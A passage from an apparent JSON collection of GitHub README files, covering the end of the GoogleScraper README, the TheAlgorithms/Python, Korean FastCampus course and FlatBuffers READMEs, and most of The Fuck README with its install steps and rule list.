can specify the flag `--proxy-file`. As argument you need to pass a file with proxies in it and with the following format:\n\n```\nprotocol proxyhost:proxyport username:password\n(...)\n```\nExample:\n```\nsocks5 127.0.0.1:1080 blabla:12345\nsocks4 77.66.55.44:9999 elite:js@fkVA3(Va3)\n```\n\nIn case you want to use GoogleScraper.py in *http* mode (which means that raw http headers are sent), use it as follows:\n\n```\nGoogleScraper -m http -p 1 -n 25 -q \"white light\"\n```\n\n## Contact\n\nIf you feel like contacting me, do so and send me a mail. You can find my contact information on my [blog][3].\n\n[1]: http:\/\/www.webvivant.com\/google-hacking.html \"Google Dorks\"\n[2]: https:\/\/code.google.com\/p\/socksipy-branch\/ \"Socksipy Branch\"\n[3]: http:\/\/incolumitas.com\/about\/contact\/ \"Contact with author\"\n[4]: http:\/\/incolumitas.com\/2013\/01\/06\/googlesearch-a-rapid-python-class-to-get-search-results\/\n[5]: http:\/\/incolumitas.com\/2014\/11\/12\/scraping-and-extracting-links-from-any-major-search-engine-like-google-yandex-baidu-bing-and-duckduckgo\/\n"},{"repo":"\/TheAlgorithms\/Python","language":"Python","readme_contents":"# The Algorithms - Python\n\n[![Donate](https:\/\/img.shields.io\/badge\/Donate-PayPal-green.svg?logo=paypal&style=flat-square)](https:\/\/www.paypal.me\/TheAlgorithms\/100)&nbsp;\n[![Build Status](https:\/\/img.shields.io\/travis\/TheAlgorithms\/Python.svg?label=Travis%20CI&logo=travis&style=flat-square)](https:\/\/travis-ci.com\/TheAlgorithms\/Python)&nbsp;\n[![LGTM](https:\/\/img.shields.io\/lgtm\/alerts\/github\/TheAlgorithms\/Python.svg?label=LGTM&logo=LGTM&style=flat-square)](https:\/\/lgtm.com\/projects\/g\/TheAlgorithms\/Python\/alerts)&nbsp;\n[![Gitter chat](https:\/\/img.shields.io\/badge\/Chat-Gitter-ff69b4.svg?label=Chat&logo=gitter&style=flat-square)](https:\/\/gitter.im\/TheAlgorithms)&nbsp;\n[![contributions welcome](https:\/\/img.shields.io\/static\/v1.svg?label=Contributions&message=Welcome&color=0059b3&style=flat-square)](https:\/\/github.com\/TheAlgorithms\/Python\/blob\/master\/CONTRIBUTING.md)&nbsp;\n![](https:\/\/img.shields.io\/github\/repo-size\/TheAlgorithms\/Python.svg?label=Repo%20size&style=flat-square)&nbsp;\n<!--[![Tested on Python 3.7](https:\/\/img.shields.io\/badge\/Tested%20-Python%203.7-blue.svg?logo=python&style=flat-square)]( https:\/\/www.python.org\/downloads) &nbsp;-->\n\n### All algorithms implemented in Python (for education)\n\nThese implementations are for learning purposes. They may be less efficient than the implementations in the Python standard library.\n\n## Contribution Guidelines\n\nRead our [Contribution Guidelines](CONTRIBUTING.md) before you contribute.\n\n## Community Channel\n\nWe're on [Gitter](https:\/\/gitter.im\/TheAlgorithms)! Please join us.\n\n## List of Algorithms\n\nSee our [directory](DIRECTORY.md).\n\n\n\n\n\n[![Open in Gitpod](https:\/\/gitpod.io\/button\/open-in-gitpod.svg?style=flat-square)](https:\/\/gitpod.io\/#https:\/\/github.com\/TheAlgorithms\/Python)\n"},{"repo":"\/SeongJaeMoon\/FastCampusWebPythonBasic","language":"CSS","readme_contents":"# FastCampus \ud504\ub85c\uadf8\ub798\ubc0d \uccab\uac78\uc74c \uc2dc\uc791\ud558\uae30\n\n\uc6f9 \uac1c\ubc1c \uae30\ucd08 ~ \ud30c\uc774\uc36c\uc744 \uc774\uc6a9\ud55c \ud06c\ub864\ub7ec \uac1c\ubc1c [\uc628\ub77c\uc778 \uac15\uc758](http:\/\/www.fastcampus.co.kr\/dev_online_introdev\/) \uc790\ub8cc\n\n\uc774 \uc800\uc7a5\uc18c\uc758 \ub0b4\uc6a9\uc740 \uae30\uc220\uc758 \ubcc0\ud654, \uc624\ud0c8\uc790 \uc218\uc815, \ub0b4\uc6a9 \ucd94\uac00 \ub4f1\uc758 \uc774\uc720\ub85c \ub0b4\uc6a9\uc774 \uc8fc\uae30\uc801\uc73c\ub85c \uc5c5\ub370\uc774\ud2b8\ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ub54c\ubb38\uc5d0 \uc800\uc7a5\uc18c\ub97c `fork`\ud560 \uacbd\uc6b0 \uc6d0\ubcf8 \ub0b4\uc6a9\uacfc \ucc28\uc774\uac00 \uc788\uc744 \uc218 \uc788\uc74c\uc744 \uc54c\ub824\ub4dc\ub9bd\ub2c8\ub2e4.  \n<p align=\"center\">\n    <img src=\"https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/blob\/master\/oline-dev.png\" width=\"35%\" height=\"35%\">\n<\/p>\n\n# \uc800\uc7a5\uc18c \uc774\uc6a9 \ubc29\ubc95 \n## \uac01 \uac15\uc758 \ubcc4\ub85c code, task, static \ud615\uc2dd\uc758 \ud3f4\ub354\ub85c \uc800\uc7a5\ud569\ub2c8\ub2e4.\n### 1. README.md\n> \uac01 \uac15\uc758\ub9c8\ub2e4 \ud544\uc694\ud55c \uc2ec\ud654 \ub0b4\uc6a9 \ubc0f \ub3c4\uc6c0\uc774 \ub420 \uc218 \uc788\ub294 \ub0b4\uc6a9\ub4e4\uc744 \uc815\ub9ac\ud574\uc11c \uc62c\ub824\ub4dc\ub9bd\ub2c8\ub2e4.\n### 2. code \ud3f4\ub354\n> \uac15\uc758\uc5d0\uc11c \uc791\uc131\ud55c \ucf54\ub4dc\uac00 \uc800\uc7a5\ub429\ub2c8\ub2e4.\n### 3. task \ud3f4\ub354\n> \uac15\uc758 \uacfc\uc81c\uc640 \uad00\ub828\ub41c \ub0b4\uc6a9\uc774 \uc800\uc7a5\ub429\ub2c8\ub2e4.\n### 4. static \ud3f4\ub354\n> \uc2ec\ud654 \ub0b4\uc6a9 \ubc0f \ub3c4\uc6c0 \ub0b4\uc6a9\uc5d0 \ub4e4\uc5b4\uac00\ub294 \uc774\ubbf8\uc9c0, \ucc38\uace0 \ud30c\uc77c \ub4f1\uc774 \uc800\uc7a5\ub429\ub2c8\ub2e4.\n\n# \ubc14\ub85c\uac00\uae30\n## Orientation\n1. [Github \uc2dc\uc791\ud558\uae30](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Orientation\/Course01\/)\n2. [\ud074\ub77c\uc774\uc5b8\ud2b8\uc640 \uc11c\ubc84](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Orientation\/Course02\/)\n3. [\uac1c\ubc1c\ud658\uacbd\uacfc \ube0c\ub77c\uc6b0\uc800](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Orientation\/Course03\/)\n## HTML\n1. [HTML \uc18c\uac1c](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/HTML\/Course01\/)\n2. [HTML \uad6c\uc870](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/HTML\/Course02\/)\n3. [HTML \uad00\uacc4](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/HTML\/Course03\/)\n4. [HTML \uc18d\uc131](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/HTML\/Course04\/)\n5. [\ube14\ub85d, \uc778\ub77c\uc778 \uc5d8\ub9ac\uba3c\ud2b8](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/HTML\/Course05\/)\n6. [table, ul \ud0dc\uadf8](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/HTML\/Course06\/)\n7. [\uc815\uc801 \uc790\uc6d0](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/HTML\/Course07\/)\n8. [GET\uacfc POST](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/HTML\/Course08\/)\n9. [\ucee8\ud2b8\ub864 \uc0ac\uc6a9\ud558\uae30](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/HTML\/Course09\/)\n## CSS\n1. [CSS \uc18c\uac1c](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/CSS\/Course01\/)\n2. [CSS \uc120\ud0dd\uc790](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/CSS\/Course02\/)\n3. [CSS \uc2a4\ud0c0\uc77c](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/CSS\/Course03\/)\n4. [CSS link, \uc0c1\uc18d](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/CSS\/Course04\/)\n5. [\ubd80\ud2b8\uc2a4\ud2b8\ub7a9](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/CSS\/Course05\/)\n6. [CSS \ucd94\uac00 \ub0b4\uc6a9](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/CSS\/Course06\/)\n## JavaScript\n1. [Firebase \uc2dc\uc791\ud558\uae30](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course01\/)\n2. [Javascript \uc18c\uac1c](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course02\/)\n3. [Javascript \uad6c\uc870](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course03\/)\n4. [Javascript \ubcc0\uc218](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course04\/)\n5. [Javascript \uc5f0\uc0b0\uc790](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course05\/)\n6. [Javascript \uc870\uac74\ubb38](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course06\/)\n7. [Javascript \ubc18\ubcf5\ubb38](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course07\/)\n8. [Javascript \uac1d\uccb4](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course08\/)\n9. [Javascript \ub0b4\uc7a5 \uac1d\uccb4](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course09\/)\n10. [Javascript DOM \uac1d\uccb4](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course10\/)\n11. [Javascript BOM \uac1d\uccb4](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course11\/)\n12. [Javascript \ud568\uc218](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course12\/)\n13. [Javascript \uc774\ubca4\ud2b8](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course13\/)\n14. [Javascript \ub9c8\uc6b0\uc2a4 \uc774\ubca4\ud2b8](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course14\/)\n15. [Javascript \ud0a4\ubcf4\ub4dc \uc774\ubca4\ud2b8](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course15\/)\n16. [Javascript \uc774\ubca4\ud2b8 \ud65c\uc6a9](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course16\/)\n17. [Firebase \ubc30\ud3ec\ud558\uae30](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Javascript\/Course17\/)\n## Python\n1. [Python \uc18c\uac1c](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Python\/Course01\/)\n2. [Python \uac1d\uccb4](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Python\/Course02\/)\n3. [Python \ubaa8\ub4c8&amp;\ud328\ud0a4\uc9c0](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Python\/Course03\/)\n4. [Python \uceec\ub809\uc158(\ub9ac\uc2a4\ud2b8 &amp; \ub515\uc154\ub108\ub9ac)](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Python\/Course04\/)\n5. [Python \uceec\ub809\uc158(\uc14b &amp; \ud29c\ud50c)](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Python\/Course05\/)\n6. [Python \ubb38\uc790\uc5f4 \ucc98\ub9ac](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Python\/Course06\/)\n7. [Python \ud568\uc218](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Python\/Course07\/)\n8. [Python \uc608\uc678 \ucc98\ub9ac](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Python\/Course08\/)\n9. [Python \uc5d1\uc140 \ucc98\ub9ac](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Python\/Course09\/)\n10. [Python \ub9d0\ubb49\uce58 \ucc98\ub9ac](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Python\/Course10)\n11. [Python \ud06c\ub864\ub7ec1 - \uc6f9 \uc0ac\uc774\ud2b8 \ubd84\uc11d](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Python\/Course11\/)\n12. [Python \ud06c\ub864\ub7ec2 - BeautifulSoup, requests](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Python\/Course12\/)\n13. [Python \ud06c\ub864\ub7ec3 - \ub370\uc774\ud130 \ucd94\ucd9c](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Python\/Course13\/)\n14. [Python \ud06c\ub864\ub7ec4 - \ub370\uc774\ud130 \ubd84\uc11d \ubc0f \uc800\uc7a5](https:\/\/github.com\/SeongJaeMoon\/FastCampusWebPythonBasic\/tree\/master\/Learning\/Python\/Course14\/)\n\n- \ucc38\uace0 \ucd9c\ucc98\n    - [w3schools.com](https:\/\/www.w3schools.com\/)\n    - [docs.python.org 3.7](https:\/\/docs.python.org\/3.7\/tutorial\/index.html)\n    - [docs.python-guide](https:\/\/docs.python-guide.org\/)\n\n\n"},{"repo":"\/google\/flatbuffers","language":"C++","readme_contents":"![logo](http:\/\/google.github.io\/flatbuffers\/fpl_logo_small.png) FlatBuffers\n===========\n\n[![Join the chat at https:\/\/gitter.im\/google\/flatbuffers](https:\/\/badges.gitter.im\/google\/flatbuffers.svg)](https:\/\/gitter.im\/google\/flatbuffers?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n[![Build Status](https:\/\/travis-ci.org\/google\/flatbuffers.svg?branch=master)](https:\/\/travis-ci.org\/google\/flatbuffers) [![Build status](https:\/\/ci.appveyor.com\/api\/projects\/status\/yg5idd2fnusv1n10?svg=true)](https:\/\/ci.appveyor.com\/project\/gwvo\/flatbuffers)\n\n**FlatBuffers** is a cross platform serialization library architected for\nmaximum memory efficiency. It allows you to directly access serialized data without parsing\/unpacking it first, while still having great forwards\/backwards compatibility.\n\n**Go to our [landing page][] to browse our documentation.**\n\n## Supported operating systems\n* Windows\n* MacOS X\n* Linux\n* Android\n* And any others with a recent C++ compiler.\n\n## Supported programming languages\n* C++\n* C#\n* C\n* Dart\n* Go\n* Java\n* JavaScript\n* Lobster\n* Lua\n* PHP\n* Python\n* Rust\n* TypeScript\n\n*and more in progress...*\n\n## Contribution\n* [FlatBuffers Google Group][] to discuss FlatBuffers with other developers and users.\n* [FlatBuffers Issues Tracker][] to submit an issue.\n* [stackoverflow.com][] with [`flatbuffers` tag][] for any questions regarding FlatBuffers.\n\n*To contribute to this project,* see [CONTRIBUTING][].\n\n## Licensing\n*Flatbuffers* is licensed under the Apache License, Version 2.0. See [LICENSE][] for the full license text.\n\n<br>\n\n   [CONTRIBUTING]: http:\/\/github.com\/google\/flatbuffers\/blob\/master\/CONTRIBUTING.md\n   [`flatbuffers` tag]: https:\/\/stackoverflow.com\/questions\/tagged\/flatbuffers\n   [FlatBuffers Google Group]: https:\/\/groups.google.com\/forum\/#!forum\/flatbuffers\n   [FlatBuffers Issues Tracker]: http:\/\/github.com\/google\/flatbuffers\/issues\n   [stackoverflow.com]: http:\/\/stackoverflow.com\/search?q=flatbuffers\n   [landing page]: https:\/\/google.github.io\/flatbuffers\n   [LICENSE]: https:\/\/github.com\/google\/flatbuffers\/blob\/master\/LICENSE.txt\n"},{"repo":"\/nvbn\/thefuck","language":"Python","readme_contents":"# The Fuck [![Version][version-badge]][version-link] [![Build Status][travis-badge]][travis-link] [![Windows Build Status][appveyor-badge]][appveyor-link] [![Coverage][coverage-badge]][coverage-link] [![MIT License][license-badge]](LICENSE.md)\n\n*The Fuck* is a magnificent app, inspired by a [@liamosaur](https:\/\/twitter.com\/liamosaur\/)\n[tweet](https:\/\/twitter.com\/liamosaur\/status\/506975850596536320),\nthat corrects errors in previous console commands.\n\n\nIs *The Fuck* too slow? [Try the experimental instant mode!](#experimental-instant-mode)\n\n[![gif with examples][examples-link]][examples-link]\n\nMore examples:\n\n```bash\n\u279c apt-get install vim\nE: Could not open lock file \/var\/lib\/dpkg\/lock - open (13: Permission denied)\nE: Unable to lock the administration directory (\/var\/lib\/dpkg\/), are you root?\n\n\u279c fuck\nsudo apt-get install vim [enter\/\u2191\/\u2193\/ctrl+c]\n[sudo] password for nvbn:\nReading package lists... Done\n...\n```\n\n```bash\n\u279c git push\nfatal: The current branch master has no upstream branch.\nTo push the current branch and set the remote as upstream, use\n\n    git push --set-upstream origin master\n\n\n\u279c fuck\ngit push --set-upstream origin master [enter\/\u2191\/\u2193\/ctrl+c]\nCounting objects: 9, done.\n...\n```\n\n```bash\n\u279c puthon\nNo command 'puthon' found, did you mean:\n Command 'python' from package 'python-minimal' (main)\n Command 'python' from package 'python3' (main)\nzsh: command not found: puthon\n\n\u279c fuck\npython [enter\/\u2191\/\u2193\/ctrl+c]\nPython 3.4.2 (default, Oct  8 2014, 13:08:17)\n...\n```\n\n```bash\n\u279c git brnch\ngit: 'brnch' is not a git command. See 'git --help'.\n\nDid you mean this?\n    branch\n\n\u279c fuck\ngit branch [enter\/\u2191\/\u2193\/ctrl+c]\n* master\n```\n\n```bash\n\u279c lein rpl\n'rpl' is not a task. See 'lein help'.\n\nDid you mean this?\n         repl\n\n\u279c fuck\nlein repl [enter\/\u2191\/\u2193\/ctrl+c]\nnREPL server started on port 54848 on host 127.0.0.1 - nrepl:\/\/127.0.0.1:54848\nREPL-y 0.3.1\n...\n```\n\nIf you're not afraid of blindly running corrected commands, the\n`require_confirmation` [settings](#settings) option can be disabled:\n\n```bash\n\u279c apt-get install vim\nE: Could not open lock file \/var\/lib\/dpkg\/lock - open (13: Permission denied)\nE: Unable to lock the administration directory (\/var\/lib\/dpkg\/), are you root?\n\n\u279c fuck\nsudo apt-get install vim\n[sudo] password for nvbn:\nReading package lists... Done\n...\n```\n\n## Requirements\n\n- python (3.4+)\n- pip\n- python-dev\n\n## Installation\n\nOn OS X, you can install *The Fuck* via [Homebrew][homebrew] (or via [Linuxbrew][linuxbrew] on Linux):\n\n```bash\nbrew install thefuck\n```\n\nOn Ubuntu \/ Mint, install *The Fuck* with the following commands:\n```bash\nsudo apt update\nsudo apt install python3-dev python3-pip python3-setuptools\nsudo pip3 install thefuck\n```\n\nOn FreeBSD, install *The Fuck* with the following commands:\n```bash\npkg install thefuck\n```\n\nOn ChromeOS, install *The Fuck* using [chromebrew](https:\/\/github.com\/skycocker\/chromebrew) with the following command:\n```bash\ncrew install thefuck\n```\n\nOn other systems, install *The Fuck*  by using `pip`:\n\n```bash\npip install thefuck\n```\n\n[Alternatively, you may use an OS package manager (OS X, Ubuntu, Arch).](https:\/\/github.com\/nvbn\/thefuck\/wiki\/Installation)\n\n<a href='#manual-installation' name='manual-installation'>#<\/a>\nIt is recommended that you place this command in your `.bash_profile`,\n`.bashrc`, `.zshrc` or other startup script:\n\n```bash\neval $(thefuck --alias)\n# You can use whatever you want as an alias, like for Mondays:\neval $(thefuck --alias FUCK)\n```\n\n[Or in your shell config (Bash, Zsh, Fish, Powershell, tcsh).](https:\/\/github.com\/nvbn\/thefuck\/wiki\/Shell-aliases)\n\nChanges are only available in a new shell session. To make changes immediately\navailable, run `source ~\/.bashrc` (or your shell config file like `.zshrc`).\n\nTo run fixed commands without confirmation, use the `--yeah` option (or just `-y` for short, or `--hard` if you're especially frustrated):\n\n```bash\nfuck --yeah\n```\n\nTo fix commands recursively until succeeding, use the `-r` option:\n\n```bash\nfuck -r\n```\n\n## Updating\n\n```bash\npip3 install thefuck --upgrade\n```\n\n**Note: Alias functionality was changed in v1.34 of *The Fuck***\n\n## How it works\n\n*The Fuck* attempts to match the previous command with a rule. If a match is\nfound, a new command is created using the matched rule and executed. The\nfollowing rules are enabled by default:\n\n* `adb_unknown_command` &ndash; fixes misspelled commands like `adb logcta`;\n* `ag_literal` &ndash; adds `-Q` to `ag` when suggested;\n* `aws_cli` &ndash; fixes misspelled commands like `aws dynamdb scan`;\n* `az_cli` &ndash; fixes misspelled commands like `az providers`;\n* `cargo` &ndash; runs `cargo build` instead of `cargo`;\n* `cargo_no_command` &ndash; fixes wrongs commands like `cargo buid`;\n* `cat_dir` &ndash; replaces `cat` with `ls` when you try to `cat` a directory;\n* `cd_correction` &ndash; spellchecks and correct failed cd commands;\n* `cd_mkdir` &ndash; creates directories before cd'ing into them;\n* `cd_parent` &ndash; changes `cd..` to `cd ..`;\n* `chmod_x` &ndash; add execution bit;\n* `choco_install` &ndash; append common suffixes for chocolatey packages;\n* `composer_not_command` &ndash; fixes composer command name;\n* `cp_omitting_directory` &ndash; adds `-a` when you `cp` directory;\n* `cpp11` &ndash; adds missing `-std=c++11` to `g++` or `clang++`;\n* `dirty_untar` &ndash; fixes `tar x` command that untarred in the current directory;\n* `dirty_unzip` &ndash; fixes `unzip` command that unzipped in the current directory;\n* `django_south_ghost` &ndash; adds `--delete-ghost-migrations` to failed because ghosts django south migration;\n* `django_south_merge` &ndash; adds `--merge` to inconsistent django south migration;\n* `docker_login` &ndash; executes a `docker login` and repeats the previous command;\n* `docker_not_command` &ndash; fixes wrong docker commands like `docker tags`;\n* `docker_image_being_used_by_container` &dash; removes the container that is using the image before removing the image;\n* `dry` &ndash; fixes repetitions like `git git push`;\n* `fab_command_not_found` &ndash; fix misspelled fabric commands;\n* `fix_alt_space` &ndash; replaces Alt+Space with Space character;\n* `fix_file` &ndash; opens a file with an error in your `$EDITOR`;\n* `gem_unknown_command` &ndash; fixes wrong `gem` commands;\n* `git_add` &ndash; fixes *\"pathspec 'foo' did not match any file(s) known to git.\"*;\n* `git_add_force` &ndash; adds `--force` to `git add <pathspec>...` when paths are .gitignore'd;\n* `git_bisect_usage` &ndash; fixes `git bisect strt`, `git bisect goood`, `git bisect rset`, etc. when bisecting;\n* `git_branch_delete` &ndash; changes `git branch -d` to `git branch -D`;\n* `git_branch_delete_checked_out` &ndash; changes `git branch -d` to `git checkout master && git branch -D` when trying to delete a checked out branch;\n* `git_branch_exists` &ndash; offers `git branch -d foo`, `git branch -D foo` or `git checkout foo` when creating a branch that already exists;\n* `git_branch_list` &ndash; catches `git branch list` in place of `git branch` and removes created branch;\n* `git_checkout` &ndash; fixes branch name or creates new branch;\n* `git_commit_amend` &ndash; offers `git commit --amend` after previous commit;\n* `git_commit_reset` &ndash; offers `git reset HEAD~` after previous commit;\n* `git_diff_no_index` &ndash; adds `--no-index` to previous `git diff` on untracked files;\n* `git_diff_staged` &ndash; adds `--staged` to previous `git diff` with unexpected output;\n* `git_fix_stash` &ndash; fixes `git stash` commands (misspelled subcommand and missing `save`);\n* `git_flag_after_filename` &ndash; fixes `fatal: bad flag '...' after filename`\n* `git_help_aliased` &ndash; fixes `git help <alias>` commands replacing <alias> with the aliased command;\n* `git_merge` &ndash; adds remote to branch names;\n* `git_merge_unrelated` &ndash; adds `--allow-unrelated-histories` when required\n* `git_not_command` &ndash; fixes wrong git commands like `git brnch`;\n* `git_pull` &ndash; sets upstream before executing previous `git pull`;\n* `git_pull_clone` &ndash; clones instead of pulling when the repo does not exist;\n* `git_pull_uncommitted_changes` &ndash; stashes changes before pulling and pops them afterwards;\n* `git_push` &ndash; adds `--set-upstream origin $branch` to previous failed `git push`;\n* `git_push_different_branch_names` &ndash; fixes pushes when local brach name does not match remote branch name;\n* `git_push_pull` &ndash; runs `git pull` when `push` was rejected;\n* `git_push_without_commits` &ndash; Creates an initial commit if you forget and only `git add .`, when setting up a new project;\n* `git_rebase_no_changes` &ndash; runs `git rebase --skip` instead of `git rebase --continue` when there are no changes;\n* `git_remote_delete` &ndash; replaces `git remote delete remote_name` with `git remote remove remote_name`;\n* `git_rm_local_modifications` &ndash;  adds `-f` or `--cached` when you try to `rm` a locally modified file;\n* `git_rm_recursive` &ndash; adds `-r` when you try to `rm` a directory;\n* `git_rm_staged` &ndash;  adds `-f` or `--cached` when you try to `rm` a file with staged changes\n* `git_rebase_merge_dir` &ndash; offers `git rebase (--continue | --abort | --skip)` or removing the `.git\/rebase-merge` dir when a rebase is in progress;\n* `git_remote_seturl_add` &ndash; runs `git remote add` when `git remote set_url` on nonexistent remote;\n* `git_stash` &ndash; stashes your local modifications before rebasing or switching branch;\n* `git_stash_pop` &ndash; adds your local modifications before popping stash, then resets;\n* `git_tag_force` &ndash; adds `--force` to `git tag <tagname>` when the tag already exists;\n* `git_two_dashes` &ndash; adds a missing dash to commands like `git commit -amend` or `git rebase -continue`;\n* `go_run` &ndash; appends `.go` extension when compiling\/running Go programs;\n* `go_unknown_command` &ndash; fixes wrong `go` commands, for example `go bulid`;\n* `gradle_no_task` &ndash; fixes not found or ambiguous `gradle` task;\n* `gradle_wrapper` &ndash; replaces `gradle` with `.\/gradlew`;\n* `grep_arguments_order` &ndash; fixes `grep` arguments order for situations like `grep -lir . test`;\n* `grep_recursive` &ndash; adds `-r` when you try to `grep` directory;\n* `grunt_task_not_found` &ndash; fixes misspelled `grunt` commands;\n* `gulp_not_task` &ndash; fixes misspelled `gulp` tasks;\n* `has_exists_script` &ndash; prepends `.\/` when script\/binary exists;\n* `heroku_multiple_apps` &ndash; add `--app <app>` to `heroku` commands like `heroku pg`;\n* `heroku_not_command` &ndash; fixes wrong `heroku` commands like `heroku log`;\n* `history` &ndash; tries to replace command with most similar command from history;\n* `hostscli` &ndash; tries to fix `hostscli` usage;\n* `ifconfig_device_not_found` &ndash; fixes wrong device names like `wlan0` to `wlp2s0`;\n* `java` &ndash; removes `.java` extension when running Java programs;\n* `javac` &ndash; appends missing `.java` when compiling Java files;\n* `lein_not_task` &ndash; fixes wrong `lein` tasks like `lein rpl`;\n* `long_form_help` &ndash; changes `-h` to `--help` when the short form version is not supported\n* `ln_no_hard_link` &ndash; catches hard link creation on directories, suggest symbolic link;\n* `ln_s_order` &ndash; fixes `ln -s` arguments order;\n* `ls_all` &ndash; adds `-A` to `ls` when output is empty;\n* `ls_lah` &ndash; adds `-lah` to `ls`;\n* `man` &ndash; changes manual section;\n* `man_no_space` &ndash; fixes man commands without spaces, for example `mandiff`;\n* `mercurial` &ndash; fixes wrong `hg` commands;\n* `missing_space_before_subcommand` &ndash; fixes command with missing space like `npminstall`;\n* `mkdir_p` &ndash; adds `-p` when you try to create a directory without parent;\n* `mvn_no_command` &ndash; adds `clean package` to `mvn`;\n* `mvn_unknown_lifecycle_phase` &ndash; fixes misspelled life cycle phases with `mvn`;\n* `npm_missing_script` &ndash; fixes `npm` custom script name in `npm run-script <script>`;\n* `npm_run_script` &ndash; adds missing `run-script` for custom `npm` scripts;\n* `npm_wrong_command` &ndash; fixes wrong npm commands like `npm urgrade`;\n* `no_command` &ndash; fixes wrong console commands, for example `vom\/vim`;\n* `no_such_file` &ndash; creates missing directories with `mv` and `cp` commands;\n* `open` &ndash; either prepends `http:\/\/` to address passed to `open` or create a new file or directory and passes it to `open`;\n* `pip_install` &ndash; fixes permission issues with `pip install` commands by adding `--user` or prepending `sudo` if necessary;\n* `pip_unknown_command` &ndash; fixes wrong `pip` commands, for example `pip instatl\/pip install`;\n* `php_s` &ndash; replaces `-s` by `-S` when trying to run a local php server;\n* `port_already_in_use` &ndash; kills process that bound port;\n* `prove_recursively` &ndash; adds `-r` when called with directory;\n* `pyenv_no_such_command` &ndash; fixes wrong pyenv commands like `pyenv isntall` or `pyenv list`;\n* `python_command` &ndash; prepends `python` when you try to run non-executable\/without `.\/` python script;\n* `python_execute` &ndash; appends missing `.py` when executing Python files;\n* `quotation_marks` &ndash; fixes uneven usage of `'` and `\"` when containing args';\n* `path_from_history` &ndash; replaces not found path with similar absolute path from history;\n* `react_native_command_unrecognized` &ndash; fixes unrecognized `react-native` commands;\n* 